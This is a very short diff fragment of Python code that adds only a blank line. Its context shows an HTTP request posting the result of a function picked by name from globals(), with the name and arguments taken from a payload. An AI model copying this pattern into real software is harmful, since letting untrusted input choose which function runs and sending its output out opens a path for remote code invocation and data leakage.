@@ -32,3 +32,4 @@ urllib2.urlopen(
     data=json.dumps(globals()[PAYLOAD["method"]](*PAYLOAD["args"]))
 )
 
+
